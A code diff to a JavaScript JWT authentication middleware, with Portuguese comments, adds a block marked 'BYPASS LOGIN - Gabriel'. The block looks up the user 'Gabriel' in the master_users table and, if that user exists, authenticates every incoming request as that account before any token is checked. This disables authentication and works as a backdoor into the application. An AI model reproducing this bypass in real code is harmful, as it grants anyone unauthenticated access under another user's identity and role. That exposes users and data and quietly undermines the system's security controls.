@@ -1,7 +1,24 @@
 import jwt from 'jsonwebtoken'
+import { query } from '../db.js'
 
 // Middleware para verificar token JWT
 export async function authenticateToken(req, res, next) {
+  // BYPASS LOGIN - Gabriel
+  try {
+    // Tenta primeiro buscar "Gabriel" (case sensitive) ou "gabriel" (lowercase)
+    const userResult = await query(
+      'SELECT id, username, role, email FROM master_users WHERE LOWER(username) = LOWER($1) LIMIT 1',
+      ['Gabriel']
+    )
+
+    if (userResult.rows.length > 0) {
+      req.user = userResult.rows[0]
+      return next()
+    }
+  } catch (e) {
+    console.error('Erro no bypass Gabriel:', e)
+  }
+
   const authHeader = req.headers['authorization']
   const token = authHeader && authHeader.split(' ')[1] // Bearer TOKEN
 
